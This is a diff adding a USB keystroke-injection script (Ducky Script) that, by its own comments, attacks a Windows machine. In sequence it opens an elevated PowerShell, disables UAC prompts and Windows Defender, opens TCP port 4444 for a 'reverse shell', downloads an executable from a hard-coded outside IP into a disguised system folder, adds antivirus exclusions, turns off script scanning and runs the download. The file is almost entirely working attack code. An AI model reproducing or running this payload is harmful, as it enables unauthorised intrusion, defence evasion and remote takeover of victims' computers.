@@ -1,0 +1,91 @@
+REM Automate Turn-Off - Windows UAC, Windows Firewall, and Windows Defender
+REM Also automate to Download the malware and connect with Reverse Shell
+REM Script to run when the system is locked.
+
+ 
+
+DELAY 1000
+REM Open PowerShell as Administrator
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 500
+
+ 
+
+REM Disabling the UAC
+STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+ENTER
+DELAY 500
+
+ 
+
+REM Add a Firewall rule to allow the Reverse Shell connection
+STRING New-NetFirewallRule -DisplayName "ReverseShellRule" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444
+ENTER
+DELAY 500
+
+ 
+
+REM Disabling the Virus and Threat Protection
+STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
+ENTER
+DELAY 500
+
+ 
+
+REM Create a new directory inside C:\Windows to store the malware
+STRING mkdir C:\Windows\SystemFiles
+ENTER
+DELAY 500
+
+ 
+
+REM Generate a random filename for the malware
+STRING $malwareFileName = Get-Random -Minimum 10000 -Maximum 99999
+ENTER
+
+ 
+
+REM Download the Prepared Malware with the random filename
+STRING $WC = New-Object System.Net.WebClient
+ENTER
+STRING $WC.DownloadFile("http://172.100.100.23/ls.exe","C:\Windows\SystemFiles\$malwareFileName.exe")
+ENTER
+DELAY 500
+
+ 
+
+REM Add an exception for the downloaded folder (including all files in it) in Windows Defender
+STRING Set-MpPreference -ExclusionPath "C:\Windows\SystemFiles\*"
+ENTER
+DELAY 500
+
+ 
+
+REM Add an additional exception for the downloaded file (in case Set-MpPreference doesn't cover it)
+STRING Add-MpPreference -ExclusionPath "C:\ls.exe"
+ENTER
+DELAY 500
+
+ 
+
+REM Configure additional Windows Defender preferences (you can add more if needed)
+STRING Set-MpPreference -DisableScriptScanning $true
+ENTER
+DELAY 500
+
+ 
+
+REM Execute the Downloaded Malware (Assuming ls.exe is the reverse shell executable)
+STRING C:\Windows\SystemFiles\$malwareFileName.exe
+ENTER
+DELAY 500
+ENTER
+
+ 
+
+REM Exit PowerShell
+STRING exit
+ENTER
